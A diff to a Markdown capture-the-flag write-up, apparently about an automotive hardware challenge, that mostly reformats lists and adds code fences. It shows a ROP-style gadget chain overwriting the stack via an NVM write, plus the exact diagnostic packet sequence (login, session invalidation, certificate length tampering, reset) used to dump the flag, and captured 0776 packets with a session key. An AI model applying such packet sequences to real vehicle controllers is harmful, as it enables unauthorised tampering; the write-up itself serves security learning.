@@ -141,27 +141,26 @@ ROM:63DD                 pop     r29
 ROM:63DE                 pop     r28
 ROM:63DF                 ret
 ```
-- We already have all the pieces, we only need to put all together. So, if we can write in the stack this code then we will get the flag:
-  yyyy 008BB1 FF xxxx 004ED9 1272
-    yyyy = pointer to the address of "B1" (just before the FF) to be loaded into r28 and r29 by the POP instructions before the ret
-    xxxx = pointer to the address of "49" (just before the 1272) to be loaded into r28 and r29 by the POP instructions before the ret
-
-1. the two pop before the ret of function 6297 will load r28:r29=yyyy (pointer to stack just before the FF value)
-2. return to 008BB1
-3. the opcode at 8BB1 will load r24=FF from stack, after will store it into $2FE0
-4. then will pop the FF and load r28:r29=xxxx (pointer to stack just before the values 1272) 
-5. return to 004ED9
-6. the opcodes at 4EE1 and 4EE2 will load r24=12 and r25=72 from stack
-7. Finally it will print the stack
+- We already have all the pieces, we only need to put all together. So, if we can write in the stack this code then we will get the flag:  
+  yyyy 008BB1 FF xxxx 004ED9 1272  
+    yyyy = pointer to the address of "B1" (just before the FF) to be loaded into r28 and r29 by the POP instructions before the ret  
+    xxxx = pointer to the address of "49" (just before the 1272) to be loaded into r28 and r29 by the POP instructions before the ret  
+  1. the two pop before the ret of function 6297 will load r28:r29=yyyy (pointer to stack just before the FF value)
+  2. return to 008BB1
+  3. the opcode at 8BB1 will load r24=FF from stack, after will store it into $2FE0
+  4. then will pop the FF and load r28:r29=xxxx (pointer to stack just before the values 1272) 
+  5. return to 004ED9
+  6. the opcodes at 4EE1 and 4EE2 will load r24=12 and r25=72 from stack
+  7. Finally it will print the stack
 	
-These are the packets sent to get the flag:
-- 0665 0002 2701                                                          -> Login Step 1 - Get Challenge
-- 0665 000A 2702 0FAF78600000000                                          -> Login Step 2 - Send Response
-- 0665 0004 31014301                                                      -> Invalidate session to force the validation of certification in next reset
-- 0665 0019 3D 22 B300 1300 A4090A08A03E 3E98 008BB1 FF 3E9E 004ED9 1272  -> Write in NVM los valores que queremos sobreescribir en el stack
-- 0665 0007 3D 22 4E00 0100 77                                            -> Increase the length of second tag of certificate 
-- 0665 0007 3D 22 4100 0100 86                                            -> Increase the length of certificate (to maintain the certificate valid)
-- Do Reset
+- These are the packets sent to get the flag:
+  - 0665 0002 2701                                                          -> Login Step 1 - Get Challenge
+  - 0665 000A 2702 0FAF78600000000                                          -> Login Step 2 - Send Response
+  - 0665 0004 31014301                                                      -> Invalidate session to force the validation of certification in next reset
+  - 0665 0019 3D 22 B300 1300 A4090A08A03E 3E98 008BB1 FF 3E9E 004ED9 1272  -> Write in NVM los valores que queremos sobreescribir en el stack
+  - 0665 0007 3D 22 4E00 0100 77                                            -> Increase the length of second tag of certificate 
+  - 0665 0007 3D 22 4100 0100 86                                            -> Increase the length of certificate (to maintain the certificate valid)
+  - Do Reset
 ```
 Initializing...
 It's dangerous to go alone! take this.cbe20e1984865e5fdb33f35c6b80001e
@@ -179,10 +178,12 @@ Resetting complete
 ### Others 2
 An example of packets of ID 0776
 Send:
+```
 0776 0100 30FE8009526973636172204341810A4E49535420502D3139328208ABBA42C0FFEE13378331048DAB11E2D3A737E2D957579FB8ABDD03C84F9BBAA89DC6335403
 54715A80A8D029B6B387F2AC2FDB00ECA3CE0DB7267E8420D9003CACAF5B935F9FCB0F1765B0CF9BD7A2A235CC03A6FAD68DA834FC8E21028586000000000000
 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+```
 ```
 Log of my arduino script:
 
@@ -231,7 +232,9 @@ Sent!
 And Serial port will receive **Session key initialized**. The session key generated is 11611BE96F4E2558EBC169A0C8DE2C3F
 	
 Send: 
+```
 0776 0001 00
+```
 ```	
 Log of my arduino script:
 
